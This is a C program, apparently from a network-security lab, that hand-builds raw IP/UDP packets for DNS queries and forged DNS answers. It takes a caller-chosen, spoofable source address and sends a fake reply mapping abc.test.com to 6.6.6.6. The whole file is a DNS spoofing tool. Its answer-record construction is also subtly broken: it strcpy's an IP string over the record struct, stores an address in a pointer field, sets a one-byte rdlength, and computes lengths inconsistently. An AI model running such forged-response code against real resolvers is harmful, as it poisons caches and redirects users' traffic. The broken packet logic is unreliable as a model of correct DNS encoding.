#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
#include <arpa/inet.h>

//Max packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
#define RR_TYPE_HOSTADDR 1
#define RR_CLASS_INTERNET 1

//Pack every structure to fit inside 
#pragma pack (push, 1)
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

struct dnsheader {
	unsigned short int query_id;
	unsigned short int flags;
	unsigned short int QDCOUNT;
	unsigned short int ANCOUNT;
	unsigned short int NSCOUNT;
	unsigned short int ARCOUNT;
};

struct dataEnd {
	unsigned short int  type;
	unsigned short int  class;
};

struct RES_RECORD {
    unsigned char *name;
    unsigned short type;
    unsigned short class;
    uint32_t ttl;
    unsigned short rdlength;
    unsigned char *rdata;
};
#pragma pack (pop)


unsigned int checksum(uint16_t *usBuff, int isize)
{
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
	    cksum+=*usBuff++;
    }
	if(isize==1) {
        cksum+=*(uint16_t *)usBuff;
    }
	return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);
	sum+=ntohs(IPPROTO_UDP+len);
	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);
	return (uint16_t)(~sum);
}

unsigned short csum(unsigned short *buf, int nwords) 
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
            sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

//doesn't send DNS query, only writes to buffer
//write to dst_buffer the actual packet.
//write to dst_pcktLen the length in bytes to send (dst_buffer size)
void dns_q(char *src_ip, char* dst_ip, char *query, char *dst_buffer, unsigned short *dst_pcktLen) 
{
    char *buffer = dst_buffer;

    //Pointer to buffer for writing to spesific memory location to create packet
    struct ipheader *ip = (struct ipheader *)  buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

	dns->flags=htons(FLAG_Q); //query flag
	dns->QDCOUNT=htons(1); //only 1 query, so the count should be one.
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    //query string
    strcpy(data, query);
    int query_s = strlen(data)+1;

    struct dataEnd *end=(struct dataEnd *)(data+query_s);

    end->type=htons(1); 
    end->class=htons(1);

    ip->iph_ihl = 5;
    ip->iph_ver = 4; //IPv4
    ip->iph_tos = 0; // Low delay
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    ip->iph_sourceip = inet_addr(src_ip);
    ip->iph_destip = inet_addr(dst_ip);

    unsigned short packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+query_s+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);

    udp->udph_srcport = htons(40000+rand()%10000);  // source port number 40k-50k
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+query_s+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    //finilize with check sum
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));

    //finnaly, the packet is ready!
    memcpy(dst_buffer, buffer, packetLength);
    *dst_pcktLen = packetLength;   
}




void dns_a(char *src_ip, char *dst_ip, char *query, char *query_answer, char *dst_buffer, unsigned short *dst_pcktLen) 
{

    
    char *buffer = dst_buffer;

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    //standart response
	dns->flags=htons(FLAG_R);
    //only 1 query, so the count should be one.
	dns->QDCOUNT=htons(1);
    //only 1 answer
    dns->ANCOUNT=htons(1);

    //query string
    strcpy(data, query);
    int length = strlen(query)+1;



    //this is for convinience to get the struct type write the 4bytes in a more organized way.

    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    struct RES_RECORD* answer=(struct RES_RECORD*)(data+length+sizeof(struct dataEnd));
    // printf("Data pointer base : %u\n", (int) data);
    // printf("Data struct pointer base : %u\n", (int) end);
    // printf("RES Record struct pointer base : %u\n", (int)answer);

    strcpy(answer, query_answer);
    answer->type = htons(1);
    answer->class = htons(1);
    answer->ttl = htonl(82400);
    answer->rdlength = htons(1);

    // printf("name offset:      %d name size:      %d\n", (int)&answer->name - (int)answer, strlen(answer->name)+1);
    // printf("type offset:      %d type size:      %d\n", (int)&answer->type - (int)answer, sizeof(answer->type));
    // printf("class offset:     %d class size:     %d\n", (int)&answer->class - (int)answer, sizeof(answer->class));
    // printf("ttl offset:       %d ttl size:       %d\n", (int)&answer->ttl - (int)answer, sizeof(answer->ttl));
    // printf("rdlength offset:  %d rdlength size:  %d\n", (int)&answer->rdlength - (int)answer, sizeof(answer->rdlength));
    // printf("rdata offset:     %d rdata size:     %d\n", (int)&answer->rdata - (int)answer, sizeof(answer->rdata));

    int class_offset = (int)&answer->class - (int)answer;
    int ttl_offset = (int)&answer->ttl - (int)answer;

    printf("ttl offset - class offset = %d\n", ttl_offset - class_offset);
    answer->rdata = inet_addr(query_answer);

    

    // for(int i = 0; i < 50; i++) {
    //     printf("%x ", *(data + i));
    // }
    // printf("\n");

    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // Fabricate the IP header or we can use the

    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay


    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+sizeof(struct RES_RECORD)+length); // length + dataEnd_size == UDP_payload_size
    //printf("Packet length = %d\n", packetLength);
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(src_ip);
    // The destination IP address
    ip->iph_destip = inet_addr(dst_ip);
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
    // Destination port number
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+sizeof(struct RES_RECORD)); // udp_header_size + udp_payload_size
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

    //finnaly, the packet is ready!
    memcpy(dst_buffer, buffer, packetLength);
    *dst_pcktLen = packetLength;   
}



int main(int argc, char** argv) {
    if(argc != 3){
    	printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
    	exit(-1);
    }

    //prepare socket
    struct sockaddr_in sin, din;
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;


    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // socket descriptor
    int sd;
    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd<0 ) // if socket fails to be created 
        printf("socket error\n");
    int one = 1;
    const int *val = &one;
    // Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");	
        exit(-1);
    }
    //
    //done preparing socket
    //




    // buffer to hold the packet - we write to this! This is the actual bytes
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);


    unsigned short packetLength = 0;

    int i = 0, max_packets = 1;
    //DNS Query
    /*
    while(i++ < max_packets) {
        dns_q(argv[1], argv[2], "\3abc\4test\3com", buffer, &packetLength);
        printf("packet len = %d\n", packetLength);
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d", errno);
    }
    */

    //DNS Answer
    char *query_answer = "6.6.6.6";
    while(i++ < max_packets) {
        dns_a(argv[1], argv[2], "\3abc\4test\3com", query_answer, buffer, &packetLength);
        printf("packet len = %d\n", packetLength);
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d", errno);
    }
    return 0;
}
